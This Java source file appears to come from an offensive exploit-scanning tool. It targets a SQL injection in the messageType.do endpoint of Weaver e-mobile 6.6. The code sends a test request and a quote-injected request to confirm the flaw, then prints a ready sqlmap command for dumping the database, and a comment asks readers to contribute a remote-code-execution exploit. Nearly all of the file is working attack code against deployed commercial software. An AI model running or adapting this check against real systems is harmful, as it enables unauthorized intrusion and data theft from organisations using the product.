package Exp.OA.weaveroa;

import Utilss.HttpTools;
import Utilss.Response;
import core.Exploitlnterface;
import javafx.scene.control.TextArea;

import java.util.HashMap;

public class weaveroa_mobile6_sqlli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        Boolean att = att(url, textArea);
        return att;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        textArea.appendText("\n e-mobile_6.6 messageType.do-SQlli暂无可以rce的exp");
        return false;
    }

    private Boolean att(String url,TextArea textArea){
        Response response = HttpTools.get(url + "/messageType.do?method=create&typeName=1", new HashMap<String, String>(), "utf-8");
        if(response.getCode() == 200 && response.getText().contains("推送类型已存在")){
            Response response1 = HttpTools.get(url + "/messageType.do?method=create&typeName=1%27", new HashMap<String, String>(), "utf-8");
            if(response1.getCode() == 200 && response1.getText().contains("status")){
                textArea.appendText("\n 注入存在 sqlmap: sqlmap.py -u \"" + url + "/messageType.do?method=create&typeName=1"
                + "\" -p typeName --dbms=H2");
                textArea.appendText("\n 该漏洞貌似可以注入java代码实现rce 但是木有找到合适的exp 有的话可以提供给我！");
                return true;
            }else {
                textArea.appendText("\n 疑似waf拦截 请手动复现");
                return false;
            }
        }else {
            textArea.appendText("\n e-mobile_6.6 messageType.do-SQlli-漏洞不存在 (出现误报请联系作者)");
            return false;
        }
    }
}
